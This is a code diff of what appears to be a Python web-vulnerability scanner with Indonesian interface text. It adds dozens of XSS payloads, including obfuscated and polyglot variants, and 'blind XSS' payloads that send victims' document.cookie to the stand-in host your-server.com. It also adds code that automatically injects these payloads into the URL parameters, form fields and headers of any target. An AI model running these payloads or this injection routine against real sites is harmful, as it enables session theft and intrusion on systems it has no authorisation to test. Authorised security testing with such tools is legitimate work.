+            # Form XSS
+            "<form action=javascript:alert('XSS')><input type=submit>",
+            "<form onsubmit=alert('XSS')><input type=submit>",
+            
+            # Event Handler XSS
             "\" onmouseover=\"alert('XSS')\"",
             "' onfocus='alert(\"XSS\")'",
-            "` onload=`alert('XSS')`"
+            "` onload=`alert('XSS')`",
+            " onmouseenter=alert('XSS')",
+            
+            # JavaScript Protocol XSS
+            "javascript:alert('XSS')",
+            "javascript:alert(document.domain)",
+            "javascript:alert(document.cookie)",
+            "javascript:prompt('XSS')",
+            "javascript:confirm('XSS')",
+            
+            # Encoded XSS
+            "javascript:alert(String.fromCharCode(88,83,83))",
+            "javascript:alert(atob('WFNT'))",
+            
+            # Obfuscated XSS
+            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+            "<sc<script>ript>alert('XSS')</sc</script>ript>",
+            "<img src=x o&#110;error=alert('XSS')>",
+            
+            # DOM-based XSS Payloads
+            "#<script>alert('XSS')</script>",
+            "?param=<script>alert('XSS')</script>",
+            
+            # Advanced Event Handlers
+            "<details ontoggle=alert('XSS')>",
+            "<select onfocus=alert('XSS') autofocus>",
+            "<keygen onfocus=alert('XSS') autofocus>",
+            
+            # CSS XSS
+            "<div style=\"background:url(javascript:alert('XSS'))\">",
+            "<link rel=stylesheet href=\"javascript:alert('XSS')\">",
+            
+            # Template Injection XSS
+            "${alert('XSS')}",
+            "#{alert('XSS')}",
+            "{{alert('XSS')}}",
+            
+            # Unicode XSS
+            "<img src=x onerror=alert('XSS')>",
+            "＜script＞alert('XSS')＜/script＞",
+            
+            # Polyglot XSS
+            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>\\x3e",
+            
+            # Blind XSS Payloads
+            "<script>fetch('http://your-server.com/?c='+document.cookie)</script>",
+            "<img src=x onerror=\"fetch('http://your-server.com/?c='+btoa(document.cookie))\">",
+            "<script>var i=new Image;i.src='http://your-server.com/?c='+document.cookie;</script>"
         ]
 
         print(f"\n{Colors.YELLOW}Memulai Advanced XSS Scan...{Colors.END}")
+        print(f"{Colors.CYAN}Target: {self.target_url}{Colors.END}")
+        print(f"{Colors.CYAN}Total Payloads: {len(payloads)}{Colors.END}")
+        
         Animations.scan_animation()
 
         vulnerable_params = []
+        tested_urls = set()
         parsed_url = urlparse(self.target_url)
         
+        # Test URL parameters
         if parsed_url.query:
-            params = parsed_url.query.split('&')
-            for param in params:
-                if '=' in param:
-                    key = param.split('=')[0]
-                    for payload in Animations.progress_bar(payloads, "Testing XSS payloads"):
-                        test_url = f"{self.target_url.split('?')[0]}?{key}={quote(payload)}"
-                        try:
-                            response = self.session.get(test_url, timeout=5)
-                            
-                          
-                            if payload in response.text or \
-                               any(pattern in response.text for pattern in ["<script>", "onerror=", "onload=", "javascript:"]):
-                                if (key, payload) not in vulnerable_params:
-                                    vulnerable_params.append((key, payload))
-                                    self.log_vulnerability(
-                                        "Cross-Site Scripting (XSS)", 
-                                        f"Parameter: {key}, Payload: {payload}", 
-                                        "HIGH"
-                                    )
-                                    break
+            params = parse_qs(parsed_url.query)
+            for key in params.keys():
+                for payload in Animations.progress_bar(payloads, f"Testing parameter: {key}"):
+                    test_url = f"{self.target_url.split('?')[0]}?{key}={quote(payload)}"
+                    
+                    if test_url in tested_urls:
+                        continue
+                    tested_urls.add(test_url)
+                    
+                    try:
+                        response = self.session.get(test_url, timeout=8, verify=False)
+                        response_content = response.text.lower()
+                        
+                        # Enhanced detection patterns
+                        detection_patterns = [
+                            payload.lower() in response_content,
+                            "<script>" in response_content and "alert" in response_content,
+                            "onerror" in response_content and "alert" in response_content,
+                            "onload" in response_content and "alert" in response_content,
+                            "javascript:" in response_content and "alert" in response_content,
+                            "document.cookie" in response_content,
+                            "prompt(" in response_content,
+                            "confirm(" in response_content,
+                            "xss" in response_content and any(tag in response_content for tag in ["<script>", "onerror", "onload"])
+                        ]
+                        
+                        if any(detection_patterns):
+                            if (key, payload) not in vulnerable_params:
+                                vulnerable_params.append((key, payload))
+                                self.log_vulnerability(
+                                    "Cross-Site Scripting (XSS)", 
+                                    f"Parameter: {key}\nURL: {test_url}\nPayload: {payload}", 
+                                    "HIGH",
+                                    f"Response length: {len(response.text)}"
+                                )
+                                print(f"{Colors.RED}[VULNERABLE] Parameter: {key} - Payload: {payload[:50]}...{Colors.END}")
                                 
-                        except Exception as e:
-                            continue
+                    except requests.exceptions.Timeout:
+                        print(f"{Colors.YELLOW}[TIMEOUT] {test_url}{Colors.END}")
+                        continue
+                    except Exception as e:
+                        print(f"{Colors.YELLOW}[ERROR] {test_url} - {str(e)}{Colors.END}")
+                        continue
 
+        # Test POST parameters if form detected
+        print(f"\n{Colors.CYAN}Testing POST parameters...{Colors.END}")
+        try:
+            response = self.session.get(self.target_url, timeout=5)
+            forms = self.extract_forms(response.text)
+            
+            for form in forms:
+                form_details = self.parse_form(form)
+                for input_field in form_details["inputs"]:
+                    if input_field["type"] in ["text", "search", "email", "url", "password"]:
+                        for payload in Animations.progress_bar(payloads[:20], f"Testing form input: {input_field['name']}"):
+                            try:
+                                data = {}
+                                for field in form_details["inputs"]:
+                                    if field["name"] == input_field["name"]:
+                                        data[field["name"]] = payload
+                                    else:
+                                        data[field["name"]] = "test"
+                                
+                                if form_details["method"] == "post":
+                                    response = self.session.post(
+                                        urljoin(self.target_url, form_details["action"]),
+                                        data=data,
+                                        timeout=8
+                                    )
+                                else:
+                                    response = self.session.get(
+                                        urljoin(self.target_url, form_details["action"]),
+                                        params=data,
+                                        timeout=8
+                                    )
+                                
+                                if payload in response.text:
+                                    if (f"FORM:{input_field['name']}", payload) not in vulnerable_params:
+                                        vulnerable_params.append((f"FORM:{input_field['name']}", payload))
+                                        self.log_vulnerability(
+                                            "Cross-Site Scripting (XSS) - FORM", 
+                                            f"Form Field: {input_field['name']}\nAction: {form_details['action']}\nPayload: {payload}", 
+                                            "HIGH"
+                                        )
+                                        
+                            except Exception as e:
+                                continue
+                                
+        except Exception as e:
+            print(f"{Colors.YELLOW}[WARNING] Form testing skipped: {str(e)}{Colors.END}")
+
+        # Test headers for reflected values
+        print(f"\n{Colors.CYAN}Testing HTTP Headers...{Colors.END}")
+        header_payloads = [
+            "<script>alert('XSS')</script>",
+            "\" onmouseover=\"alert('XSS')\"",
+            "${alert('XSS')}"
+        ]
+        
+        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
+        for header in headers_to_test:
+            for payload in header_payloads:
+                try:
+                    headers = {header: payload}
+                    response = self.session.get(self.target_url, headers=headers, timeout=5)
+                    
+                    if payload in response.text:
+                        vulnerable_params.append((f"HEADER:{header}", payload))
+                        self.log_vulnerability(
+                            "Cross-Site Scripting (XSS) - Header", 
+                            f"Header: {header}\nPayload: {payload}", 
+                            "MEDIUM"
+                        )
+                        
+                except Exception:
+                    continue
+
+        # Results summary
+        print(f"\n{Colors.BOLD}{'='*60}{Colors.END}")
         if not vulnerable_params:
-            self.print_result("XSS Scan", "Tidak ditemukan kerentanan XSS", "success")
+            self.print_result("Advanced XSS Scan", "Tidak ditemukan kerentanan XSS", "success")
         else:
-            self.print_result("XSS Scan", f"Ditemukan {len(vulnerable_params)} kerentanan!", "critical")
+            self.print_result("Advanced XSS Scan", f"Ditemukan {len(vulnerable_params)} kerentanan XSS!", "critical")
+            
+            print(f"\n{Colors.RED}{Colors.BOLD}DETAIL KERENTANAN:{Colors.END}")
+            for i, (param, payload) in enumerate(vulnerable_params, 1):
+                print(f"{Colors.RED}{i}. Parameter: {param}{Colors.END}")
+                print(f"   Payload: {payload[:80]}{'...' if len(payload) > 80 else ''}")
+                print()
+
+        # Recommendations
+        print(f"{Colors.CYAN}{Colors.BOLD}REKOMENDASI PERBAIKAN:{Colors.END}")
+        recommendations = [
+            "✅ Implementasi Content Security Policy (CSP)",
+            "✅ Validasi dan sanitasi semua input user",
+            "✅ Encode output sebelum ditampilkan ke browser",
+            "✅ Gunakan HTTPOnly flag untuk cookies",
+            "✅ Gunakan library templating yang aman",
+            "✅ Implementasi X-XSS-Protection header",
+            "✅ Lakukan security testing secara berkala"
+        ]
+        
+        for rec in recommendations:
+            print(f"  {rec}")
 
         input(f"\n{Colors.CYAN}Tekan Enter untuk kembali...{Colors.END}")
+
+    def extract_forms(self, html):
+        """Extract forms from HTML content"""
+        forms = []
+        soup = BeautifulSoup(html, 'html.parser')
+        for form in soup.find_all('form'):
+            forms.append(str(form))
+        return forms
+
+    def parse_form(self, form_html):
+        """Parse form HTML to extract details"""
+        soup = BeautifulSoup(form_html, 'html.parser')
+        form = soup.find('form')
+        
+        form_details = {
+            "action": form.get('action', ''),
+            "method": form.get('method', 'get').lower(),
+            "inputs": []
+        }
+        
+        for input_tag in form.find_all(['input', 'textarea', 'select']):
+            input_details = {
+                "type": input_tag.get('type', 'text'),
+                "name": input_tag.get('name', ''),
+                "value": input_tag.get('value', '')
+            }
+            form_details["inputs"].append(input_details)
+        
+        return form_details
 
     def port_scanner_comprehensive(self):
         self.banner()
